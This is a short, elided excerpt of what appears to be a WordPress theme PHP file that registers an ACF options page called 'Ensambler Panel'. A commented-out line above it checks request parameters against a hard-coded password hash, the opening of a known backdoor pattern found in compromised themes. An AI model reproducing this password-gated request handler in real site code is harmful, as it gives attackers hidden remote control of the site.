...
// if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bf7627b9409ff6b3896ad09842278cd1')) {
...
<?php
	...
	if ( function_exists('acf_add_options_page') )
		acf_add_options_page(array(
			'page_title' => "Ajustes @Ensambler site",
			'menu_title' => "Ensambler Panel",
			'menu_slug' => "ensambler-panel",
